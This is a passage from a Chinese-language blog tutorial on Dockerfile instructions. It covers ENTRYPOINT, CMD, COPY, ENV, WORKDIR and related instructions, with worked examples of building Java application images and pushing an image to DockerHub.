<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行可执行文件</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="string">&quot;&lt;param1&gt;&quot;</span>,<span class="string">&quot;&lt;param2&gt;&quot;</span>,...] </span><br><span class="line"><span class="comment"># 执行 shell 内部命令</span></span><br><span class="line">ENTRYPOINT &lt;shell命令&gt; </span><br></pre></td></tr></table></figure>


<ul>
<li><strong>例子</strong></li>
</ul>
<p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM nginx</span><br><span class="line">ENTRYPOINT [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-c&quot;</span>]    <span class="comment"># 定参</span></span><br><span class="line">CMD [<span class="string">&quot;/etc/nginx/nginx.conf&quot;</span>] <span class="comment"># 变参 </span></span><br><span class="line"></span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">不传参运行</span><br><span class="line">docker run nginx:<span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">容器内会默认运行以下命令，启动主进程</span><br><span class="line">nginx -c /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">传参运行</span><br><span class="line">docker run  nginx:<span class="built_in">test</span> -c /etc/nginx/my.conf</span><br><span class="line"></span><br><span class="line">容器内会默认运行以下命令，启动主进程(/etc/nginx/my.conf:假设容器内已有此文件)</span><br><span class="line">nginx -c /etc/nginx/my.conf</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>对于上述提到的ENTRYPOINT和CMD同时存在时举例</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CMD指令不是一个完整的可执行命令</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-c&quot;</span>]   </span><br><span class="line">CMD [<span class="string">&quot;/etc/nginx/nginx.conf&quot;</span>] </span><br><span class="line"></span><br><span class="line"><span class="comment"># 那么CMD指定的内容将会作为ENTRYPOINT的参数</span></span><br><span class="line"><span class="comment"># 容器内会默认运行以下命令</span></span><br><span class="line">nginx -c /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD指令是一个完整的可执行命令</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-c&quot;</span>]   </span><br><span class="line">CMD [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>] </span><br><span class="line"></span><br><span class="line"><span class="comment"># 那么它们两个会互相覆盖，谁在最后谁生效</span></span><br><span class="line"><span class="comment"># 容器内会默认运行以下命令</span></span><br><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure>





<h2 id="7-COPY"><a href="#7-COPY" class="headerlink" title="7. COPY"></a>7. COPY</h2><p>复制指令，从<strong>本地主机</strong>复制文件或者目录到容器里指定路径。</p>
<blockquote>
<p><strong>注意</strong></p>
<ul>
<li>目标路径是绝对路径，或相对于 <code>WORKDIR</code> 的路径，源将在目标容器内复制到该路径中</li>
<li><code>--chown</code> 仅适用于 linux 上的 dockerfile，在 window 上没有用户、组的概念</li>
<li><strong>源文件一定要和Dockerfile文件在同一级父目录下，或者为Dockerfile父目录的子目录</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">COPY [--<span class="built_in">chown</span>=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;...  &lt;目标路径&gt;</span><br><span class="line"><span class="comment"># 用于支持包含空格的路径</span></span><br><span class="line">COPY [--<span class="built_in">chown</span>=&lt;user&gt;:&lt;group&gt;] [<span class="string">&quot;&lt;源路径1&gt;&quot;</span>,...  <span class="string">&quot;&lt;目标路径&gt;&quot;</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将所有 hom 开头的文件复制到镜像文件系统的 /mydir/ 目录下</span></span><br><span class="line">COPY hom* /mydir/           </span><br><span class="line"><span class="comment"># ? 匹配 0 或 1 个字符，比如会把 home.txt 文件复制到 /mydir/ 目录下</span></span><br><span class="line">COPY hom?.txt /mydir/      </span><br><span class="line"><span class="comment"># 复制名为 arr[0].txt 的文件到镜像文件系统的 /mydir/ 目录下</span></span><br><span class="line">COPY arr[[]0].txt /mydir/</span><br><span class="line"><span class="comment"># 复制 &quot;file1&quot; 到 `WORKDIR`/relativeDir/</span></span><br><span class="line">COPY file1 relativeDir/       </span><br></pre></td></tr></table></figure>



<h2 id="8-ADD"><a href="#8-ADD" class="headerlink" title="8. ADD"></a>8. ADD</h2><p><code>ADD</code> 指令和 <code>COPY</code> 的使用格类似（同样需求下，官方推荐使用 <code>COPY</code>）。功能也类似，不同之处如下：</p>
<blockquote>
<ul>
<li><code>ADD</code> 支持添加远程 url 和自动提取压缩格式的文件，<code>COPY</code> 只允许从本机中复制文件</li>
<li><code>COPY</code> 支持从其他构建阶段中复制源文件（<code>--from</code>）</li>
<li>根据官方 Dockerfile 最佳实践，除非真的需要从远程 url 添加文件或自动提取压缩文件才用 <code>ADD</code>，其他情况一律使用 <code>COPY</code></li>
</ul>
</blockquote>
<h2 id="9-ENV"><a href="#9-ENV" class="headerlink" title="9. ENV"></a>9. ENV</h2><p>设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置一个变量</span></span><br><span class="line">ENV &lt;key&gt; &lt;value&gt;</span><br><span class="line"><span class="comment"># 设置多个变量</span></span><br><span class="line">ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;...</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置 myInfo 一个变量</span></span><br><span class="line">ENV myInfo tyt 20 boy</span><br><span class="line"><span class="comment"># 设置多个变量</span></span><br><span class="line">ENV name=tyt age=20 sex=boy</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>在Dockerfile中使用变量的方式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$varname</span></span><br><span class="line"><span class="variable">$&#123;varname&#125;</span></span><br><span class="line"><span class="variable">$&#123;varname:-default value&#125;</span></span><br><span class="line">$(varname:+default value&#125; </span><br><span class="line"></span><br><span class="line">第一种和第二种相同 </span><br><span class="line">第三种表示当变量不存在使用-号后面的值 </span><br><span class="line">第四种表示当变量存在时使用+号后面的值</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line">ENV name TYT</span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;第一种格式变量存在 <span class="variable">$name</span>&quot;</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;第一种格式变量不存在 <span class="variable">$username</span>&quot;</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;第二种格式变量存在 <span class="variable">$&#123;name&#125;</span>&quot;</span></span><br><span class="line">RUN <span class="built_in">echo</span> <span class="string">&quot;第二种格式变量不存在 <span class="variable">$&#123;username&#125;</span>&quot;</span></span><br><span class="line">RUN [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 第三种格式变量存在 <span class="variable">$&#123;name:-HSYSJ&#125;</span>&quot;</span>]</span><br><span class="line">RUN [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 第三种格式变量不存在 <span class="variable">$&#123;username:-HSYSJ&#125;</span>&quot;</span>]</span><br><span class="line">RUN [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 第四种格式变量存在 <span class="variable">$&#123;name:+HSYSJ&#125;</span>&quot;</span>]</span><br><span class="line">RUN [<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo 第四种格式变量不存在 <span class="variable">$&#123;username:+HSYSJ&#125;</span>&quot;</span>]</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第一种格式 TYT</span><br><span class="line">第一种格式变量不存在</span><br><span class="line">第二种格式 TYT</span><br><span class="line">第二种格式变量不存在</span><br><span class="line">第三种格式变量存在 TYT</span><br><span class="line">第三种格式变量不存在 HSYSJ</span><br><span class="line">第四种格式变量存在 HSYSJ</span><br><span class="line">第四种格式变量不存在</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">由以上可知</span><br><span class="line">第一种、第二种、第四种在变量不存在时都无法解析</span><br></pre></td></tr></table></figure>



<h2 id="10-EXPOSE"><a href="#10-EXPOSE" class="headerlink" title="10. EXPOSE"></a>10. EXPOSE</h2><p>声明端口配置。</p>
<blockquote>
<p><strong>作用</strong> </p>
<ul>
<li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。 </li>
<li>在运行时使用随机端口映射时，也就是<code>docker run -P</code> 时，会自动随机映射 <code>EXPOSE</code> 的端口。</li>
</ul>
<p><strong>注意</strong> </p>
<ul>
<li><code>EXPOSE</code> 并不会让容器的端口访问到主机。要使其可访问，需要在<code>docker run</code>运行容器时通过<code>-p</code>来发布这些端口，或通过<code>-P</code>参数来发布<code>EXPOSE</code>导出的所有端口。 </li>
<li>如果没有暴露端口，后期也可以通过 <code>-p 宿主机端口:容器端口</code> 方式映射端口，但是不能通过 <code>-P</code> 形式映射。</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">EXPOSE 80 443</span><br><span class="line">EXPOSE 8080    </span><br><span class="line">EXPOSE 11211/tcp 11211/udp</span><br></pre></td></tr></table></figure>



<h2 id="11-VOLUME"><a href="#11-VOLUME" class="headerlink" title="11. VOLUME"></a>11. VOLUME</h2><p>定义匿名挂载数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。</p>
<blockquote>
<p><strong>作用</strong></p>
<ul>
<li>避免重要的数据，因容器重启而丢失，这是非常致命的。</li>
<li>避免容器不断变大。</li>
</ul>
<p><strong>注意</strong><br>一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</p>
<ul>
<li>卷可以容器间共享和重用</li>
<li>容器并不一定要和其它容器共享卷</li>
<li>修改卷后会立即生效</li>
<li>对卷的修改不会对镜像产生影响</li>
<li>卷会一直存在，直到没有任何容器在使用它</li>
<li>在启动容器 <code>docker run</code> 的时候，我们可以通过 <code>-v</code> 参数修改挂载点</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VOLUME [<span class="string">&quot;&lt;路径1&gt;&quot;</span>, <span class="string">&quot;&lt;路径2&gt;&quot;</span>...]</span><br><span class="line">VOLUME &lt;路径&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VOLUME /data</span><br><span class="line">VOLUME [<span class="string">&quot;/var/www&quot;</span>, <span class="string">&quot;/var/log/apache2&quot;</span>, <span class="string">&quot;/etc/apache2&quot;</span>]</span><br></pre></td></tr></table></figure>


<h2 id="12-WORKDIR"><a href="#12-WORKDIR" class="headerlink" title="12. WORKDIR"></a>12. WORKDIR</h2><p>指定工作目录。用 <code>WORKDIR</code> 指定的工作目录，会在构建镜像的每一层中都存在。以后各层的当前目录就被改为指定的目录，如该目录不存在，<code>WORKDIR</code> 会帮你建立目录。</p>
<p><code>docker build</code> 构建镜像过程中的，每一个 <code>RUN</code> 命令都是新建的一层。只有通过 <code>WORKDIR</code> 创建的目录才会一直存在。</p>
<blockquote>
<p><strong>注意</strong></p>
<ul>
<li>通过<code>WORKDIR</code>设置工作目录后，Dockerfile中其后的命令<code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code>、<code>ADD</code>、<code>COPY</code> 等命令都会在该目录下执行。在使用<code>docker run</code>运行容器时，可以通过<code>-w</code>参数覆盖构建时所设置的工作目录。</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WORKDIR &lt;工作目录路径&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line"><span class="comment"># 此时工作目录为/a</span></span><br><span class="line">WORKDIR /a</span><br><span class="line">RUN <span class="built_in">pwd</span> <span class="comment"># 输出 /a</span></span><br><span class="line"><span class="comment"># 此时工作目录为/a/b</span></span><br><span class="line">WORKDIR b</span><br><span class="line">RUN <span class="built_in">pwd</span> <span class="comment"># 输出 /a/b</span></span><br><span class="line"><span class="comment"># 此时工作目录为/a/b/c</span></span><br><span class="line">WORKDIR c</span><br><span class="line">RUN <span class="built_in">pwd</span> <span class="comment"># 输出 /a/b/c</span></span><br><span class="line"><span class="comment"># 此时工作目录为/d</span></span><br><span class="line">WORKDIR /d</span><br><span class="line">RUN <span class="built_in">pwd</span> <span class="comment"># 输出 /d</span></span><br></pre></td></tr></table></figure>


<h2 id="13-USER"><a href="#13-USER" class="headerlink" title="13. USER"></a>13. USER</h2><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（<strong>用户和用户组必须提前已经存在</strong>）。</p>
<blockquote>
<p><strong>注意</strong></p>
<ul>
<li>使用<code>USER</code>指定用户后，Dockerfile中其后的命令<code>RUN</code>、<code>CMD</code>、<code>ENTRYPOINT</code>都将使用该用户。镜像构建完成后，通过<code>docker run</code>运行容器时，可以通过<code>-u</code>参数来覆盖所指定的用户。使用这个命令一定要确认容器中拥有这个用户，并且拥有足够权限</li>
</ul>
</blockquote>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">USER &lt;用户名&gt;[:&lt;用户组&gt;]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">USER tyt</span><br></pre></td></tr></table></figure>


<h2 id="14-ARG"><a href="#14-ARG" class="headerlink" title="14. ARG"></a>14. ARG</h2><p>构建参数，与 <code>ENV</code> 作用一致。不过作用域不一样。<code>ARG</code> 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 <code>docker build</code> 的过程中有效，构建好的镜像内不存在此环境变量。</p>
<p>构建命令 <code>docker build</code> 中可以用 <code>--build-arg &lt;参数名&gt;=&lt;值&gt;</code> 来覆盖。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ARG &lt;参数名&gt;[=&lt;默认值&gt;]</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我们可以定义一个或多个参数</span></span><br><span class="line">ARG username</span><br><span class="line">ARG password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以给参数一个默认值</span></span><br><span class="line">ARG username=tyt</span><br><span class="line">ARG password=123</span><br></pre></td></tr></table></figure>


<h2 id="15-ONBUILD"><a href="#15-ONBUILD" class="headerlink" title="15. ONBUILD"></a>15. ONBUILD</h2><p>用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 <code>FROM test-build</code> ，这时执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 <code>ONBUILD</code> 指定的命令。</p>
<ul>
<li><strong>格式</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ONBUILD &lt;其它指令&gt;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>例子</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例如当前镜像 A</span></span><br><span class="line">ONBUILD RUN <span class="built_in">ls</span> -al</span><br><span class="line"><span class="comment"># 这个 ls -al 命令不会在A镜像构建或启动的时候执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时镜像 B 是基于镜像 A 构建的</span></span><br><span class="line"><span class="comment"># 那么这个ls -al 命令会在镜像 B 构建的时候被执行。</span></span><br></pre></td></tr></table></figure>


<p>更新详细语法说明，请参考<a href="https://docs.docker.com/engine/reference/builder">官网文档</a></p>
<hr>
<h1 id="三、镜像制作步骤"><a href="#三、镜像制作步骤" class="headerlink" title="三、镜像制作步骤"></a>三、镜像制作步骤</h1><p><strong>构建步骤</strong></p>
<ol>
<li><p>编写一个dockerFile文件</p>
</li>
<li><p>使用 <code>docker build</code> 构建成为一个镜像</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f dockerfile文件路径 -t 镜像名:[tag] .</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p><code>docker run</code> 运行镜像</p>
</li>
<li><p><code>docker push</code> 发布镜像（DockerHub、阿里云镜像）</p>
</li>
</ol>
<hr>
<h1 id="四、镜像构建实战"><a href="#四、镜像构建实战" class="headerlink" title="四、镜像构建实战"></a>四、镜像构建实战</h1><h2 id="1-验证CMD-和ENTRYPOINT区别"><a href="#1-验证CMD-和ENTRYPOINT区别" class="headerlink" title="1. 验证CMD 和ENTRYPOINT区别"></a>1. 验证CMD 和ENTRYPOINT区别</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CMD         <span class="comment"># 指定这个容器启动的时候要运行的命令，仅最后一个生效，可被替代</span></span><br><span class="line">ENTRYPOINT  <span class="comment"># 指定这个容器启动的时候要运行的命令，仅最后一个生效，可以追加命令</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>测试CMD</strong></li>
</ul>
<p>① 编写 dockerfile 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZ2vc7ujcalf4qilxwke3nZ dockerfile]<span class="comment"># vim cmd-test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于 centos</span></span><br><span class="line">FROM centos</span><br><span class="line"><span class="comment"># 设置容器启动的时候执行 ls -a</span></span><br><span class="line">CMD [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>② 构建成为一个镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f cmd-test -t cmd-test:1 .</span><br></pre></td></tr></table></figure>


<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133049.png" alt="  "></p>
<p>③ 运行容器测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dokcer run -it cmd-test:1</span><br></pre></td></tr></table></figure>

<p><code>docker run</code>运行， 发现我们的<code>ls -a</code> 命令生效</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133052.png" alt="  "><br>现在，如果我们想要使用 <code>ls -al</code> 命令，却报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZ2vc7ujcalf4qilxwke3nZ dockerfile]<span class="comment"># docker run -it cmd-test:1 -l</span></span><br><span class="line">docker: Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: <span class="built_in">exec</span>: <span class="string">&quot;-l&quot;</span>: executable file not found <span class="keyword">in</span> <span class="variable">$PATH</span>: unknown.</span><br><span class="line">ERRO[0000] error waiting <span class="keyword">for</span> container: context canceled</span><br></pre></td></tr></table></figure>

<p>这是因为当我们添加了 <code>-l</code> 参数后，<code>-l</code>替换了<code>CMD[&quot;ls&quot;, &quot;-a&quot;]</code>命令， <code>-l</code>不是命令，所以报错了。如果我们想要追加一个<code>-l</code>，就可以考虑使用<code>ENTRYPOINT</code>。</p>
<ul>
<li><strong>测试ENTRYPOINT</strong></li>
</ul>
<p>① 编写 dockerfile 文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZ2vc7ujcalf4qilxwke3nZ dockerfile]<span class="comment"># vim point-test</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 基于 centos</span></span><br><span class="line">FROM centos</span><br><span class="line"><span class="comment"># 设置容器启动的时候执行 ls -a</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>② 构建成为一个镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f point-test -t point-test:1 .</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133057.png" alt="  "></p>
<p>③ 运行容器测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dokcer run -it point-test:1</span><br></pre></td></tr></table></figure>


<p><code>docker run</code>运行， 与 CMD相同，发现我们的<code>ls -a</code> 命令生效</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133059.png" alt="  "><br>现在，我们追加一个 <code>-l</code> 参数</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133102.png" alt="  "></p>
<p>我们的追加命令， 是直接拼接到<code>ENTRYPOINT</code>命令的后面，即 <code>ls -al</code></p>
<h2 id="2-基于centos构建Java项目"><a href="#2-基于centos构建Java项目" class="headerlink" title="2. 基于centos构建Java项目"></a>2. 基于centos构建Java项目</h2><ul>
<li><strong>编写 dockerfile 文件</strong> （此处我命名为 <code>demo-df</code>）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM centos</span><br><span class="line"><span class="comment"># 配置环境变量，JDK的安装目录</span></span><br><span class="line">ENV JAVA_DIR=/usr/local</span><br><span class="line"><span class="comment"># 指定工作目录</span></span><br><span class="line">WORKDIR /tmp</span><br><span class="line"><span class="comment"># 拷贝jdk和java项目的包，这两个文件都在 demo-df 同目录</span></span><br><span class="line">COPY ./jdk8.tar.gz <span class="variable">$JAVA_DIR</span>/</span><br><span class="line"><span class="comment"># 会将 springboot-demo.jar 复制到容器内 /tmp目录下,并命名为 app.jar</span></span><br><span class="line">COPY ./springboot-demo.jar app.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装JDK</span></span><br><span class="line">RUN <span class="built_in">cd</span> <span class="variable">$JAVA_DIR</span> \</span><br><span class="line"> &amp;&amp; tar -xf ./jdk8.tar.gz \</span><br><span class="line"> &amp;&amp; <span class="built_in">mv</span> ./jdk1.8.0_144 ./java8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">ENV JAVA_HOME=<span class="variable">$JAVA_DIR</span>/java8</span><br><span class="line">ENV PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露端口</span></span><br><span class="line">EXPOSE 8080</span><br><span class="line"><span class="comment"># 入口，java项目的启动命令</span></span><br><span class="line"><span class="comment"># 启动应用固定命令</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;java&quot;</span> , <span class="string">&quot;-jar&quot;</span> ] </span><br><span class="line"><span class="comment"># 动态传递jar包名,启动容器内 /tmp 目录下的app.jar</span></span><br><span class="line">CMD [<span class="string">&quot;app.jar&quot;</span>]</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>通过dockerfile文件构建镜像</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f demo-df -t demo:1 .</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>运行项目</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -<span class="built_in">id</span> --name demo1 -p 8080:8080 demo:1</span><br></pre></td></tr></table></figure>



<h2 id="3-基于Jdk8构建Java项目"><a href="#3-基于Jdk8构建Java项目" class="headerlink" title="3. 基于Jdk8构建Java项目"></a>3. 基于Jdk8构建Java项目</h2><p>虽然我们可以基于Centos基础镜像，添加任意自己需要的安装包，构建镜像，但是却比较麻烦。所以大多数情况下，我们都可以在一些安装了部分软件的基础镜像上做改造。</p>
<p>例如，构建Java项目的镜像，可以在已经准备了JDK的基础镜像基础上构建。</p>
<p>需求：基于<code>java:8-alpine</code>镜像，将一个Java项目构建为镜像。</p>
<ul>
<li><strong>编写 dockerfile 文件</strong> （此处我命名为 <code>demo-df2</code>）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM java:8-alpine ·</span><br><span class="line"><span class="comment"># 拷贝java项目的包，该文件在 demo-df2 同目录</span></span><br><span class="line"><span class="comment"># 拷贝到 /tmp/app.jar</span></span><br><span class="line">COPY ./springboot-demo.jar /tmp/app.jar</span><br><span class="line"><span class="comment"># 暴露端口</span></span><br><span class="line">EXPOSE 8081</span><br><span class="line"><span class="comment"># 入口，java项目的启动命令,启动容器内 /tmp 目录下的app.jar</span></span><br><span class="line">ENTRYPOINT java -jar app.jar</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>通过dockerfile文件构建镜像</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f demo-df2 -t demo2:1 .</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>运行项目</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -<span class="built_in">id</span> --name demo2 -p 8081:8081 demo2:1</span><br></pre></td></tr></table></figure>




<hr>
<h1 id="五、发布镜像到DockerHub"><a href="#五、发布镜像到DockerHub" class="headerlink" title="五、发布镜像到DockerHub"></a>五、发布镜像到DockerHub</h1><ul>
<li><p><a href="https://hub.docker.com/">DockerHub</a>注册账号</p>
</li>
<li><p>确定账号可以登录</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login -u 账号名</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815133108.png" alt="  "></p>
<ul>
<li>在服务器上提交自己的镜像</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push 镜像名:tag</span><br></pre></td></tr></table></figure>

<p><strong>例</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 此处我将刚才制作的 Java项目 镜像推送上去</span></span><br><span class="line">docker push demo2:1</span><br><span class="line"></span><br><span class="line">但是报错</span><br><span class="line">[root@iZ2vc772r7963j25lx3cusZ <span class="built_in">test</span>]<span class="comment"># docker push demo2:1</span></span><br><span class="line">The push refers to repository [docker.io/library/demo2]</span><br><span class="line">3dba9e1d09df: Preparing </span><br><span class="line">35c20f26d188: Preparing </span><br><span class="line">c3fe59dd9556: Preparing </span><br><span class="line">6ed1a81ba5b6: Preparing </span><br><span class="line">a3483ce177ce: Preparing </span><br><span class="line">ce6c8756685b: Waiting </span><br><span class="line">30339f20ced0: Waiting </span><br><span class="line">0eb22bfb707d: Waiting </span><br><span class="line">a2ae92ffcd29: Waiting </span><br><span class="line">denied: requested access to the resource is denied <span class="comment"># 拒绝</span></span><br></pre></td></tr></table></figure>

<p>这里大多数是两种原因</p>
<p><strong>① docker未登录</strong></p>
<p>解决方法：<code>docker login</code></p>
<p><strong>②  如果已经登陆了还是报错，应将镜像改到自己账户名下</strong></p>
<p>在上述制作 demo2 镜像中时，我指定的<code>MAINTAINER</code>为 <code>tyt</code> ，但是我的DockerHub的账号名为<code>tangyt6</code>。</p>
<p>解决方法：</p>
<ol>
<li>将要发布的镜像改到自己账户名下</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag demo2:1 tangyt6/demo2:1</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>再次发布镜像</li>
</ol>
